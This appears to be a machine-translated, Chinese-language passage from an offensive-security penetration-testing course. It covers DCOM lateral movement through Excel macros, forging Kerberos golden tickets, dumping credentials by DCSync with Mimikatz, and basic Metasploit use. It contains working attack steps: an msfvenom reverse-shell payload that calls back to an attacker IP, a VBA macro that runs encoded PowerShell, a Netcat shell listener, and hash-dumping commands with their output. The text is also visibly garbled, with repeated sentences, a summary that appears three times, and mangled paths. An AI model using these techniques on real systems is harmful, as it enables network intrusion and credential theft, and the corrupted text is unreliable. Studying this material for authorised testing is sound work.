+## 21.4.4 分布式组件对象模型
+
+在本节中，我们将仔细研究一种相当新的、利用分布式组件对象模型（DCOM）的横向移动技术。
+
+> 还有两种值得提到的其他横向移动技术：滥用 Windows 管理规范（WMI）和称为 PowerShell 远程（PowerShell Remoting）的技术。虽然我们在这里不会详细介绍这些方法，
+
+微软组件对象模型（COM）是一种用于创建相互交互的软件组件的系统。虽然 COM 是为了同进程或跨进程交互而创建，但它被扩展为分布式组件对象模型（DCOM），用于网络上多个计算机之间的交互。COM 和 DCOM 都是非常老旧的技术，可以追溯到 Windows 的最早版本。它们有自己的优缺点，并在 PowerShell 和 Python 中都有实现。
+
+与 DCOM 的交互通过端口 `135` 上的 RPC 执行。与 DCOM 的交互通过端口 `135` 上的 RPC 执行。与 DCOM 的交互通过端口 `135` 上的 RPC 执行。与 DCOM 的交互通过端口 `135` 上的 RPC 执行。与 DCOM 的交互通过端口 `135` 上的 RPC 执行。与 DCOM 的交互通过端口 `135` 上的 RPC 执行。与 DCOM 的交互通过端口 `135` 上的 RPC 执行。与 DCOM 的交互通过端口 `135` 上的 RPC 执行。与 DCOM 的交互通过端口 `135` 上的 RPC 执行。在此示例中，我们必须通过指定程序标识符（例如 `Excel.Application`）。
+
+```
+$com = [activator]::CreateInstance([type]::GetTypeFromProgId("Excel.Application"))
+```
+
+列表 710 - 创建 DCOM 对象并枚举方法
+
+| 名称 | 成员类型 | 定义 |
+| :--- | :--- | :--- |
+| ActivateMicrosoftApp | 方法 | void ActivateMicrosoftApp (XLApplication) |
+| AddChartAutoFormat | 方法 | void AddChartAutoFormat (Variant, string, Varia) |
+| ResetTipWizard | 方法 | void ResetTipWizard (Variant...) |
+| Run | 方法 | void Run (Variant...) |
+| Save | 方法 | void Save (Variant) |
+| Workbooks | 属性 | Workbooks () {get} |
+
+此脚本产生以下输出：
+
+```
+TypeName:System.ComObject#(000208d5-0000-0000-c000-00000000046)
+Name MemberType Definition
+--------------------------------------------
+ActivateMicrosoftApp Method void ActivateMicrosoftApp (XLApplication)
+AddChartAutoFormat Method void AddChartAutoFormat (Variant, string, Varia)
+ResetTipWizard Method void ResetTipWizard (Variant...)
+Run Method Variant Run (Variant...)
+Save Method void Save (Variant)
+Workbooks Property Workbooks () {get}
+```
+
+输出包含许多对象和方法，我们将关注 `Run` 方法，它允许我们远程执行 Visual 应用程序（VBA）宏。
+
+要使用此方法，我们将通过在 Excel 中选择“视图”选项卡并点击“宏”，创建一个带有概念验证的 Excel 文档。在这个简单的概念验证中，我们将使用一个启动 `notepad.exe` 的 VBA 宏。
+
+```
+Sub mymacro()
+Shell ("notepad.exe")
+End Sub
+```
+
+我们已宏命名为 "mymacro" 并以旧格式保存 Excel 文件。为了执行宏，我们使用 `.NET.IO.File` 类的 `Copy` 方法复制文件。调用它时，我们指定源文件、目标文件以及一个指示在必要时覆盖目标文件的标志，如下 PowerShell 代码所示：
+
+```powershell
+$LocalPath = "C:\Users\jeff-admin.corp\myexcel.xls"
+$RemotePath = "\\\192.168.1.110\$\myexcel.xls"
+[System.IO.File]::Copy($LocalPath, $RemotePath, $True)
+```
+
+列表 713 - 将 excel 复制到远程计算机
+
+# 攻击性安全 (OFFENSIVE)
+
+www.offensive-security.com
+
+在我们对宏执行 `Run` 方法之前，我们必须首先指定 `Workbooks` 对象的 Excel 文档方法693。该方法也可以通过 DCOM 在方法和对象的枚举中可用：
+
+| TypeName: System__ComObject(C:000280d5-0000-0000-c000-000000000046) | 方法定义 |
+| :--- | :--- |
+| ActivateMicrosoftApp | void ActivateMicrosoftApp (XLMSApplication) |
+| AddChartAutoFormat | void AddChartAutoFormat (Variant, String) |
+
+
+
+| ResetTipWizard | void ResetTipWizard (...) |
+
+| Run | void Run (Variant) |
+
+| Save | void Save (Variant) |
+
+| Workbooks | Property Workbooks Workbooks (get) |
+
+列表 714 - 输出 Workbooks 属性
+
+Workbooks 对象是由我们之前创建的 `$Com` COM 句柄生成的，用于执行我们的
+
+我们可以直接使用如下代码调用 `Open` 方法：
+
+```powershell
+$Workbook = $Com.Workbooks.Open("C:\myexcel.xls")
+```
+
+列表 715 - 在域控上打开 excel 文档
+
+然而，在与远程计算机交互时这会导致错误：
+
+```powershell
+$Workbook = $Com.Workbooks.Open("C:\myexcel.xls"
+Unable to get the Open property of the Workbooks class
+At line:1 char i:
+$Workbook = $Com.Workbooks.Open("C:\myexcel.xls")
+```
+
+* * CategoryInfo : OperationStopped: (:), COMException
+
+* FullyQualifiedErrorCode : System.Runtime.InteropServices.COMException
+
+列表 716 - 尝试打开电子表格时出错
+
+此错误的原因是 `Excel.Application` 是通过 DCOM 实例化的，它是 SYSTEM 账户运行的，该账户没有配置文件（profile），而配置文件是打开过程的一部分。要修复这个问题，我们只需在 `C:\Windows\SysWOW64\systemprofile` 下创建 Desktop 文件夹即可满足这一要求。
+
+我们可以使用以下 PowerShell 代码创建它：
+
+```powershell
+$Path = "\\1192.168.1.110\C:\Windows\sysWOW64\systemprofile\Desktop"
+$temp = [system.io.directory]::createDirectory($Path)
+```
+
+列表 717 - 创建系统配置文件文件夹
+
+693 (Microsoft, 2017), msdn.microsoft.com/en-us/books/excel-ba/articles/workbooks-open-method-excel
+
+694 (Microsoft, 2017), msdn.microsoft.com/en-us/books/excel-ba/articles/workbooks-object-excel
+
+695 (Matt Nelson, 2017), https://enigmau3.com/2017/09/11/lateral-movement-using-excel-application-and-dcom/
+
+PWK 2.0
+
+© Offensive Security Ltd. 保留所有权利。668
+
+# 攻击性安全 (OFFENSIVE)
+
+使用 Kali Linux 2.0 进行渗透测试
+
+一旦创建了系统账户的打开文件夹，我们就可以尝试再次 `Open` 方法，这应该会成功并打开 Excel 文档。
+
+现在文档内容已经打开，我们可以使用带有完整的 PowerShell 脚本调用 `Run` 方法。
+
+```powershell
+$com = [activator]::CreateInstance([type]::GetTypeProgId("Excel.Application", "192.168.1.110"))
+$LocalPath = "C:\Users\jeff_admin.corp\myexcel.xls"
+$RemotePath = "\\192.168.1.110\myexcel.xls"
+[System.IO.File]::Copy($LocalPath, $RemotePath, $True)
+$Path = "\\192.168.1.110\c:\Windows\Sys64\config\systemprofile\Desktop"
+$temp = [system.io.directory]::createDirectory($Path)
+$Workbook = $com.Workbooks.Open("C:\myexcel.xls")
+$com.Run("mymacro")
+```
+
+列表 718 - 代码证明：通过增加图中内容索引的优先级级别，在后台进程中执行 Excel 宏运行环境。
+
+| services exe | | | | | Microsoft Corporation | | | |
+
+| :--- | :--- | :--- | :--- | :--- | :--- | :--- | :--- |
+
+| excel.exe | 0.01 | 7.46K | 9.504K | 776 Controller and app | Microsoft Corporation | 64 bit | |
+
+| winword.exe | 0.04 | 30.32K | 22.708K | 932 Host Process for Windows S... | Microsoft Corporation | 64 bit | |
+
+| RuntimeBroker.exe | 0.10 | 10.98K | 31.214K | 4196 Flunker Broker | Microsoft Corporation | 64 bit | |
+
+| ShellHost.exe | 0.05 | 21.32K | 40.546K | 278 Windows System Experience H. | Microsoft Corporation | 64 bit | |
+
+| svchost.exe | 0.06 | 66.12K | 51.888K | 6428 App-Container | Microsoft Corporation | |
+
+| explorer.exe | 0.02 | 21.36K | 10.582K | 6000 COM Surrogate | Microsoft Corporation | |
+
+| notepad.exe | | 120 | 9.476 | 6447 32-bit Windows Local Service | Microsoft Corporation | |
+
+| EXCEL.EXE | | 24.61K | 20.50K | 4999 Lock Session | Microsoft Corporation | |
+
+| cmd.exe | 0.01 | 31.804K | 43.706K | 5500 Windows Local Service | Microsoft Corporation | |
+
+| notepad.exe | | 120 | 9.476K | 6447 Notepad | Microsoft Corporation | |
+
+图 32 - 从 Excel 启动 Notepad
+
+在创建重启 shell 时，由于我们使用一个打开的文档，可以快速使用客户端执行。要做到这一点，我们必须使用 `msfvenom` 为 HTA 创建载荷，因为它包含 Base64。
+
+```bash
+kali@kali:~ msfvenom -p windows/shell_reverse_tcp HOST=192.168.1.111 PORT=4444 -f hta -o evil.hta
+No platform selected, choosing Platform::Windows x86
+No encoder or badchars specified, outputting raw payload
+Payload size: 324 bytes
+Final size of hta-payload: 661 bytes
+```
+
+列表 719 - 使用 msfvenom 创建 HTA 载荷
+
+PWK 2.0
+
+# 攻击性安全 (OFFENSIVE)
+
+www.offensivecurity.com
+
+使用 Kali Linux 2.0 进行渗透测试
+
+注意我们使用 Windows 10 客户端的第二个 IP 地址，以便域控回连我们的 Netcat 监听。接下来，我们执行以 "`powershell.exe -e`" 开头的行，后接 Base64 载荷，并使用简单的 Python 脚本将命令拆分，以绕过 Linux 字符串限制：
+
+```python
+str = "powershell.exe -e aQBmACgAwwAGJABQ...."
+n = 50
+for i in range(0, len(str), n):
+    print(str[i:i+n] + "\n")
+```
+
+720 - 拆分 Base64 编码字符串的 Python 脚本
+
+
+
+我们将更新宏以执行 PowerShell 而不是 Notepad，并重复将其上传到域控并执行的操作。
+
+```vba
+Sub MyMacro()
+    Dim Str As String
+    Str = Str + "powershell.exe -nop -e aQBmACgAwwAGJ4Ad"
+    Str = Str + "AQBAHQAgCQbAd0BTAGKAegB1ACAALQB1HEAEA0A0AckA"
+    Str = Str + "EQQAQAgACgBvAHHMMA4B4AgMAACwAuFAccVAGMAZQBZHM"
+    Str = Str + "AXQ6ADOAwB0BAGEAcgB0ACAgJABZckewA"
+    Shell (Str)
+End Sub
+```
+
+### 721 - 更新宏
+
+在执行宏之前，我们将在 Windows 10 上启动一个 Netcat 监听，以接收来自域控的反向 shell：
+
+```cmd
+PS C:\Tools\practical_tools> nc.exe -lnvp 4444
+
+listening on [4444]
+connect to [192.168.1.111] (UNKNOWN) [192.168.1.110] 59121
+Microsoft Windows [Version 10.0.14393]
+(c) 2016 Microsoft Corporation. 保留所有权利。
+```
+
+```cmd
+C:\Windows\System32>
+```
+
+### 722 - DCOM 横向移动技术的反向 shell
+
+虽然攻击需要访问 DCOM 的 TCP 135 和 SMB 的 TCP 445，但这是一个相对新的横向移动向量，可能会避免某些检测系统，如网络入侵检测或主机杀毒软件。
+
+#### 21.4.4.1 练习
+
+- 1. 重复使用 Excel 和 DCOM 启动 Netcat 的练习。
+- 2. 通过将 VBA 宏替换为返回 Windows 虚拟机 Netcat 的连接来改进攻击。
+- 3. 从域控到你的 Kali 机器建立通道并获取反向 shell。
+
+PWK 2.0 | 版权 © Offensive Security Ltd. 保留所有权利。
+
+# 21.5 活动目录持久化 (Active Directory Persistence)
+
+一旦我们获得了访问并实现了任务的主要目标，我们的下一个目标就是获取持久化，确保我们不会失去对受害机器的访问。
+
+我们可以在 AD 环境中使用传统的持久化方法，也可以获得 AD 特有的持久化。请注意，在真实的渗透测试或红队行动中，持久化不在范围范围内，因为在评估完成后存在无法完全移除的风险。
+
+## 21.5.1 黄金票 (Golden Tickets)
+
+回到 Kerberos 身份验证的解释，我们记得当用户提交 TGT 请求时，KDC 使用域内 KDC 已知的密钥密钥加密 TGT。该密钥实际上是名为 `krbtgt`⁶⁶ 的域用户账户的密码哈值。
+
+# 攻击性安全
+
+www.offensive-security.com
+
+控制器。更高的功能级别允许启用额外的特性、功能和安全缓解措施。
+
+通过这种持久化技术，我们将首先尝试以 Offsec 用户的身份通过 `PsExec` 从 Windows 10 工作站横向移动到域控制器。
+
+这应该会失败，因为我们没有适当的权限：
+
+```
+C:\Tools\active_directory\psexec.exe \cmd.exe
+```
+
+```
+PsExec v2.2 - Execute processes remotely
+Copyright (C) 2001-2016 Mark Russovich
+Sysinternals - www.sysinternals.com
+
+Couldn't access dc01:
+Access is denied.
+```
+
+列表 723 - 尝试横向移动失败
+
+在渗透的这个阶段，我们应该已经拥有一个域管理员组账户的访问权限，或者我们已经攻破了域控制器本身。
+
+有了这些权限，我们可以使用 `Mimikatz` 提取 `krbtgt` 账户的密码哈希。
+
+为了模拟这一过程，我们将使用 `feat_admin` 账户通过远程桌面登录到域控制器，从 `C:` 文件夹运行 `Mimikatz`，并使用如下所示的 `lsadump::la` 命令：
+
+```
+mimikatz # privilege::debug
+Privilege '20' OK
+
+mimikatz # lsadump::la /patch
+Domain : CORP / S-1-5-21-160287558-278752331-2259479638
+
+RID : 00001f4 (500)
+User : Administrator
+LM : :
+NTLM : e2b475c1dda2a748290d87aa966c327
+
+RID : 00001f5 (501)
+User : Guest
+LM : :
+NTLM :
+
+RID : 00001f6 (502)
+User : krbtgt
+LM : :
+NTLM : 75b60230a2394a812000dbfad4815965
+```
+
+列表 724 - 使用 Mimikatz 导出 krbtgt 密码
+
+> 698 (Benjamin Delhy, 2016), https://github.com/gentikiwi/mimikatz/wiki/~lsadump
+
+# 使用 Kali Linux 2.0 进行渗透测试
+
+![](img/f99f528ca9845f4c256ce54e882b1345_672_0.png)
+
+创建黄金令牌（golden token）并将其注入内存不需要任何管理员权限，并且可以在未加入域的计算机上执行。我们将从被攻破的工作站使用哈希并注入程序。
+
+在生成黄金令牌之前，我们将使用 `kerberos:purge` 删除任何现有的 Kerberos 票据。
+
+我们将域 SID（可以通过 `whoami /user` 获取）提供给 Mimikatz 的 `kerberos:golden` 命令以创建黄金令牌。这次我们将使用 `/krbtgt` 选项而不是 `/rc4` 来表示我们提供密码哈希。我们将黄金令牌的用户名设置为 `fakeruser`。这是被允许的，因为域控制器信任任何由 krbtgt 哈希加密的内容。
+
+```
+mimikatz kerberos:purge OK
+Ticket(s) for current session is OK
+
+mimikatz kerberos:golden /user:fakeruser /domain:corp.corp /sid:S-1-5-21-162082755887-287523311-259947968 /krbtgt:75b602...
+User : fakeruser
+Domain : corp.corp
+SID : S-1-5-21-162082755887-287523311-259947968
+User Id : 500
+Groups : *513 512 520 518
+ServiceKey: 75b60230a239a8412800dbdfad8415965 rc_hmac_nat
+Lifetime : 14/02/2028 15.08; 12/02/2028 15.08; 12/02/2028 15.08
+\> Ticket : \* Pass The Ticket \*
+\\> PAC generated
+\> PAC signed
+\> EnTTicketPacket generated
+\> EnTTicketPacket encrypted
+\> Krbred generated
+```
+
+**已成功提交当前会话的“fakeruser @ corp.com”黄金令牌**
+
+```
+mimikatz # misc:cmd
+Patch OK for 'cmd.exe' from 'KiwiAndCMD' @ 012E3A24
+```
+
+Mimikatz 在使用黄金票据选项时提供两组默认值，即用户 ID 和组 ID。用户 ID 默认设置为 500，这是域中内置管理员的 RID，而组 ID 的值包含 Active Directory 中权限最高的组，包括域管理员（Domain Admins）。
+
+将黄金令牌注入内存后，我们可以启动一个新的命令提示符 `misc:cmd`：
+
+```
+C:\Users\offsec> psexec.exe \dc01 cmd.exe
+PsExec v2.2 - Execute processes remotely
+Copyright (C) 2001-2016 Mark Russovich
+```
+
+# Sysinternals - www.sysinternals.com
+
+```
+C:\Windows\system32\ipconfig
+```
+
+Windows IP 配置
+
+以太适配器 Ethernet0:
+
+
+
+```
+Connection-specific Suffix : 
+Link-local IPv6 Address : fe80::aad:eec:3692
+IPv4 Address . . . . . . . . : 192.168.1.110
+Subnet Mask . . . . . . . . : 255.255.255.0
+Default Gateway . . . . . . . . : 192.168.1.1
+```
+
+```
+C:\Windows\system32\whoami
+```
+
+```
+corp\fakeuser
+```
+
+```
+C:\Windows\system32\whoami /groups
+```
+
+组信息：
+
+| 组名称 | 类型 | 属性 |
+| :--- | :--- | :--- |
+| Everyone | 已知组 | 默认启用 |
+| BUILTIN\Administrators | 别名 | 默认启用 |
+| BUILTIN\Users | 别名 | 默认启用 |
+| NT AUTHORITY\Authenticated Users | 已知组 | 默认启用 |
+| NT AUTHORITY\Organization | 已知组 | 默认启用 |
+| CORP\Domain Admins | 组 | 默认启用 |
+| CORP\Group Policy | 组 | 默认启用 |
+| CORP\Schema Admins | 组 | 默认启用 |
+| CORP\Enterprise Admins | 组 | 默认启用 |
+
+## 726 使用黄金令牌和 PsExec 进行 NTLM 认证
+
+在渗透的这个阶段，我们应该已经拥有一个域管理员组账户的访问权限，或者我们已经攻破了域控制器。
+
+为了减少怀疑，考虑使用 Kerberos 认证。域控制器。
+
+> 698 (Benjamin Delhy, 2016), 我们使用黄金令牌并显示到一个不存在的用户名。
+
+注意，如果我们通过 IP 地址连接域控制器而不是主机名使用 PsExec，仍然会被拦截。
+
+```
+C:\Users\offsec> psexec.exe \\192.168.1.110 cmd.exe
+PsExec v2.2 - Execute processes remotely
+Copyright (C) 2001-2016 Mark Russovich
+```
+
+列表 727 - NTLM 认证被阻止
+
+## 21.5.1 练习
+
+1. 重复上述步骤导出 `krbtgt` 密码哈希并使用黄金票据。
+
+2. 为什么在功能级别从 Windows 2003 升级到 Windows 2008 时，`krbtgt` 账户的密码哈希发生了变化？
+
+## 21.5.2 域控制器同步
+
+在 Active Directory 基础设施中实现持久化的另一种方法是获取所有用户的哈希。
+
+我们可以移动到域控制器并运行 `Mimikatz` 来导出所有用户的密码哈希。我们还可以提取 `NTDS.dit` 文件。`NTDS.dit` 是存储在硬盘上的 Active Directory 副本，类似于用于本地账户的 `SAM` 数据库。
+
+这些方法可能有效，但会留下访问痕并且可能某些工具。另一种方法是利用 AD 功能从工作站远程捕获哈希。在生产环境中，拥有多个域控制器。目录复制服务协议同步这些不同的域控制器。域控制器可能会请求对象的更新，例如 `IDL_DRSGetChanges` API。
+
+幸运的是，接收更新的域控制器并不验证请求是否来自域控制器，而只验证关联 SID 是否具有适当权限。如果我们从属于域管理员组的用户向域控制器发出伪造更新请求，将成功。
+
+在下一个示例中，我们将以 `jeff_` 的身份登录到 Windows 10 客户端，模拟破解域管理员账户并进行侦察。
+
+> 700 (Microsoft, 2017), https://technet.microsoft.com/en-us/library/cc961761.aspx
+
+> 701 (Microsoft, 2017), https://msdn.microsoft.com/en-us/library/cc220856.aspx
+
+> 702 (Microsoft, 2016), https://technet.microsoft.com/en-us/library/cc77276(v-ws10).aspx
+
+> 703 (Microsoft, 2017), https://msdn.microsoft.com/en-us/library/dt206791.aspx
+
+PWK 2.0
+
+Copyright © Offensive Security Ltd. All rights reserved.
+
+675
+
+使用 Kali Linux 2.0 进行渗透测试
+
+# 攻击性安全
+
+www.offensive-security.com
+
+我们将打开 `Mimikatz` 使用 `lsadump::dsync`⁷⁰⁴ 启动复制，并使用用户选项识别要同步的目标用户，在本例中为内置的域管理员账户，列表 728 所示。
+
+```
+mimikatz lsadump::dsync /user:Administrator
+```
+
+```
+[DC] 'corp.com' 将是域
+[DC] '01.corp.com' 将是 DC 服务器
+[DC] 'Administrator' 将是用户账户
+```
+
+```
+Object RDN : Administrator
+```
+
+```
+*\* SAM 账户 \*\*
+SAM Username : Administrator
+User Principal Name : Administrator@corp.com
+Account Type : 30000000 (USER_OBJECT)
+User Account Control : 00010200 (NORMAL_ACCOUNT_DONT_EXPIRE_PASSWD)
+Account expiration :
+Password last change : 05/02/2018 19:33:19
+Object Security ID : S-1-5-21-166287557-287852311-2599479668-500
+Object Relative ID : 500
+```
+
+凭据：
+
+Hash NTLM: e2b475c11da2a0748290d87aa966c327
+
+tlm- 0: e2b475c11da2a0748290d87aa966c327
+
+lm - 0: 91d3b64375b6bcd2d201ca59182e6f5
+
+补充凭据：
+
+*Primary:NTLM-Strong-NTOWF *
+
+随机值 : f62e88f00ddff9bc79f8bad31bffa7d
+
+*Primary:Kerberos-Newer-Keys *
+
+默认盐 : CORP.COMAdministrator
+
+默认迭代 : 4096
+
+凭据
+
+aes256_hmac (4096) : 4c63db0995861dc7c78da81a55903c2x75c160d0d9bed85cfd5af02dab0f1
+
+aes128_hmac (4096) : 85b66d5482fc1c985884adda7fd1d9b818a
+
+des_cbc_md5 (4096) : 021c6df8bf078384a
+
+```
+* Primary: Kerberos *
+默认盐 : CORP.COMAdministrator
+凭据
+des_cbc_md5 : 021c6df8bf078384a
+```
+
+```
+* 软件包 \WIDest *
+NTLM-Strong-NTOWF
+01 4ce48211bb09675db670666998d2161bf
+02 3c9be2ff339c36ef2fd28fb43aa656d09a
+03 2cf173493627892601b7e36fc01e2d7
+04 4ce48211bb09675db670666998d2161bf
+```
+
+> ⁷⁰⁴ (Benjamin Davis, 2016), 出自 https://github.com/gentiki/mimikatz/wiki/module~~lsadump
+
+PWK 2.0
+
+版权 © Offensive Security Ltd. 保留所有。
+
+676
+
+使用 Kali Linux 2.0 进行渗透测试
+
+攻击性安全
+
+www.offensecurity.com
+
+05 3c9be2ff39c36ef2f84b63aa656089a
+
+> 列表 728 - 使用 DCSync 为 Administrator 转储密码哈希值
+
+转储内容包含与最后二十九个使用的用户密码相关的多个哈希值，以及用于上述 AES 加密的哈希值。
+
+使用上述技术，我们可以向域控制器请求复制更新，并在获取 Active Directory 中每个账户的密码哈希值时，无需登录域控制器。
+
+### 21.6 总结
+
+本模块提供了 Active Directory 及其相关安全的概述和一些见解。虽然这里提到了并解释了许多技术，但还有许多其他值得探索的技术。
+
+
+
+特别应该注意的是，本模块中对操作安全（`opsec`）的关注较少，取决于客户的成熟程度，在执行枚举和横向移动时，如果不盲目执行所示的每一个命令和技术，花些精力避免被检测，这可能是值得的。
+
+![](img/f99f528ca9845f4c256ce54e882b1345_676_0.png)
+
+PWK 2.0
+
+版权 © Offensive Security Ltd. 保留所有。
+
+677
+
+## Metasploit 框架
+
+在我们完成前面的模块时，显而易对于使用公共利用程序（`exploits`）是困难的。它们必须修改以适应每种场景，必须经过恶意代码测试，每个利用程序都使用唯一的命令行语法，并且编码或语言上没有标准。某些利用程序是用 `Perl` 编写的。
+
+使用上述方法，我们可以向域控制器请求复制更新，并在获取 `Active Directory` 中每个账户的密码哈希值时，无需登录域控制器。
+
+### 21.6 总结
+
+本模块提供了 `Active Directory` 及其相关安全的概述和一些见解。虽然这里提到了并解释了许多技术，但还有许多其他值得探索的技术。
+
+特别应该注意的是，本模块中对操作安全（`opsec`）的关注较少，取决于客户的成熟程度，在执行枚举和横向移动时，如果不盲目执行所示的每一个命令和技术，花些精力避免被检测，这可能是值得的。
+
+![](img/f99f528ca9845f4c256ce54e882b1345_676_0.png)
+
+
+
+使用 Kali Linux 2.0 进行渗透测试
+
+- 列表 728 - 使用 DCSync 为 Administrator 转储密码哈希值
+
+转储内容包含与最后二十九个使用的用户密码相关的多个哈希值，以及用于上述 AES 加密的的哈希值。
+
+使用上述技术，我们可以向域控制器请求复制更新，并在获取 Active Directory 中每个账户的密码哈希值时，无需登录域控制器。
+
+### 21.6 总结
+
+本模块提供了 Active Directory 及其相关安全的概述和一些见解。虽然这里提到了并解释了许多技术，但还有许多其他值得探索的技术。
+
+特别应该注意的是，本模块中对操作安全（`opsec`）的关注较少，取决于客户的成熟程度，在执行枚举和横向移动时，如果不盲目执行所示的每一个命令和技术，花些精力避免被检测，这可能是值得的。
+
+![](img/f99f528ca9845f4c256ce54e882b1345_676_0.png)
+
+[+] 其他特定模块参数为：`missing`, `advanced`, `evasion`, `targets`, `ac`
+
+列表 734 `show` 命令的帮助标志
+
+要激活一个模块，请使用 `use` 命令后接模块名称（例如示例中的 `auxiliary/scanner/portscan/tcp`）。此时，提示符将显示该模块。我们可以使用 `back` 退出当前上下文并返回主 `msf5`：
+
+```
+msf5 > use auxiliary/scanner/portscan/tcp
+```
+
+```
+msf5 auxiliary(scanner/portscan/tcp) > back
+```
+
+```
+msf5 >
+```
+
+列表 735 - Metasploit `use` 和 `back` 命令
+
+`back` 的变体是 `previous`，它可以让我们切换到上一个选择的模块而不是返回提示符：
+
+```
+msf5 > use auxiliary/scanner/portscan/tcp
+```
+
+```
+msf5 auxiliary(scanner/portscan/tcp) > use auxiliary/scanner/portscan/syn
+```
+
+```
+msf5 auxiliary(scanner/portscan/syn) > previous
+```
+
+```
+msf5 auxiliary(scanner/portscan/tcp) >
+```
+
+列表 736 - Metasploit `previous` `previous` 命令
+
+大多数模块在运行之前都需要选项（`show options`）。我们可以使用 `set` 配置选项，并使用 `set` 和 `unset` 分别可以移除全局选项。
+
+```
+msf5 auxiliary(scanner/portscan/tcp) > show options
+```
+
+模块选项 (`auxiliary/scanner/portscan/tcp`):
+
+| 名称 | 当前设置 | 强制 | 描述 |
+|---|---|---|---|
+| `CONCURRENCY` | 10 | yes | 每个线程检查的并发端口数 |
+| `DELAY` | 0 | yes | 每个线程的连接之间的延迟 |
+| `JITTER` | 0 | yes | 延迟抖动因子（按宽度最大值） |
+| `PORTS` | 1-1000 | yes | 要扫描的端口（例如 22-25,80,110-900） |
+| `RHOSTS` |  | yes | 目标地址或 CIDR 标识符 |
+| `THREADS` | 1 | yes | 并发线程数 |
+| `TIMEOUT` | 1000 |  | 套接字连接超时时间（毫秒） |
+
+列表 737 - `auxiliary/scanner/portscan/tcp` 的选项
+
+例如，要使用 `scanner/portscan/tcp` 模块对我们的 Windows 工作站进行扫描，必须先用 `set` 命令设置远程主机 IP 地址（`RHOSTS`）。
+
+```
+msf5 auxiliary(scanner/portscan/tcp) > set RHOSTS 10.11.0.22
+RHOSTS => 10.11.0.22
+```
+
+列表 738 - `RHOSTS` 选项
+
+配置好模块后，我们可以运行它：
+
+```
+# msf5 auxiliary(scanner/portscan/tcp) > run
+```
+
+- [+] 10.11.0.22: - 10.11.0.22:80 - TCP OPEN
+- [+] 10.11.0.22: - 10.11.0.22:135 - TCP OPEN
+- [+] 10.11.0.22: - 10.11.0.22:139 - TCP OPEN
+- [+] 10.11.0.22: - 10.11.0.22:445 - TCP OPEN
+- [+] 10.11.0.22: - 10.11.0.22:3389 - TCP OPEN
+- [+] 10.11.0.22: - 10.11.0.22:5040 - TCP OPEN
+- [+] 10.11.0.22: - 10.11.0.22:9121 - TCP OPEN
+
+[*] 扫描了 1 个主机主机 (100% 完成)
+
+[*] 辅助模块执行完成
+
+列表 730 - 使用 Metasploit 进行端口扫描
+
+### 22.1.2 Metasploit 数据库访问
+
+如果 `postgresql` 服务正在运行，Metasploit 将把发现的主机、服务或凭据的结果和信息记录在一个方便、可访问的数据库中。
+
+在以下列表中，数据库已经填充了我们在上一节运行的 TCP 扫描结果。我们可以使用 `services` 命令显示这些结果：
+
+```
+msf5 auxiliary(scanner/portscan/tcp) > services
+Services
+host             port proto name state info
+---- ---- ---- ---- ---- 
+10.11.0.22       80   tcp               open
+10.11.0.22       135  tcp               open
+10.11.0.22       139  tcp               open
+10.11.0.22       445  tcp               open
+10.11.0.22       3389 tcp               open
+10.11.0.22       5040 tcp               open
+10.11.0.22       9121 tcp               open
+```
+
+列表 740 - 数据库中的 TCP 端口扫描结果
+
+`basic services` 命令显示所有端口，但我们通过端口号 (`-p`)、服务名称 (`-s`) 进行过滤，并在 `services -h` 的帮助输出中查看更多内容。
+
+
+
+```
+msf5 > services -h
+Usage: services -h [-u] [-a] [-r <protocol>] [-p <port1,port2>] [-s <name1,name2>] [-o <filename>]
+-a,--addr           添加服务而不是搜索
+-d,--delete         删除搜索的服务
+-c <col1,col2>      仅显示指定的列
+-h,--help           显示此信息
+-s,--name           要添加的服务名称
+-p,--port           搜索端口列表
+-r <protocol>       添加服务的协议类型
+-u,--up            仅显示哪些服务在线
+-o <file>           将输出发送到 csv 格式的文件
+-<column>            按指定列排序
+-R,--rhosts         从结果设置 RHOSTS
+-S,--search         通过字符串搜索
+-U,--update         更新现有服务
+```
+
+列表 741 - `services` 命令
+
+除了简单的 tcp 端口扫描器，我们还可以使用 `dbnmap` 封装在 Metasploit 内部执行 `nmap` 并方便访问数据库。`dbnmap` 命令与 `nmap` 语法相同，如下：
+
+```
+msf5 > dbnmap [--save] [--help] [nmap options]
+msf5 > dbnmap 10.11.0.22 -A -Pn
+[*] Nmap: 10.11.0.22 的扫描报告
+[*] Nmap: 主机在线 (latency)。
+[*] Nmap: 未显示：关闭端口
+[*] Nmap: PORT STATE
+[*] Nmap: 80/tcp open http
+[*] Nmap: http-generator: HTTP
+[*] Nmap: http-title: Enterprise
+[*] Nmap: 135/tcp open Microsoft RPC
+[*] Nmap: 139/tcp open Windows net-ss
+[*] Nmap: 445/tcp open microsoft-ds
+[*] Nmap: 3389/tcp open Terminal Services
+```
+
+列表 742 - 在 Metasploit 中执行 `nmap` 扫描
+
+要显示为止发现的所有主机，可以使用 `hosts` 命令。例如，我们还可以通过 `services -p 445` 列出端口 445 上运行的服务。
+
+```
+msf5 > hosts
+Hosts
+address         mac             name           os_name        os_flavor purpose
+-------------- ------------ ------------ ----------------------
+10.11.0.22       00:00:2a:ae:3e    Windows Longhorn device
+msf5 > services -p 445
+Services
+=======
+host             port proto name            state info
+-------------- ---- ---- ------------------ open
+10.11.0.22       445    tcp    microsoft-ds open ()
+```
+
+列表 743 - 数据库中的主机和服务
+
+为了组织数据库内容，Metasploit 允许我们将信息存储在单独的工作空间（`workspaces`）中。指定工作空间时，只会看到与该空间相关的数据库条目，有助于管理各种枚举尝试。我们可以使用 `workspace` 列出可用的工作空间，或提供工作空间名称作为参数切换到不同的工作空间，如列表 744 所示。
+
+## 使用 Kali Linux 进行渗透测试
+
+```
+msf5 > workspace
+test
+* default
+```
+
+```
+msf5 > workspace test
+[*] workspace: test
+```
+
+列表 744 - Metasploit Framework 中的 `workspaces`
+
+要添加或删除工作空间，可以分别使用 `-a` 或 `-d` 后接工作空间名称，依此类推。
+
+## 22.1.3 辅助模块
+
+Metasploit Framework 包含了数百个辅助模块，提供协议枚举、端口扫描、模糊测试、嗅探等功能。模块遵循常见的破折号分隔的分级语法（模块类型/操作系统、厂商、应用或协议/模块名称），这便于探索和使用这些模块。辅助模块适用于许多任务，包括信息收集（`gather/hierarchy` 下）以及各种服务的扫描和枚举（`scanner/hierarchy` 下）。
+
+内容太多无法全部涵盖，我们将演示最常用辅助模块的扫描和操作。作为练习，请探索其他辅助模块，它们是 Metasploit Framework 不可缺的一部分。
+
+要列出所有辅助模块，我们运行 `show auxiliary` 命令。这将呈现所有辅助模块的长列表，如下方的截断输出所示：
+
+```
+msf5 > show auxiliary
+```
+
+| 名称 | 级别 | 描述 |
+
+|---|---|---|
+
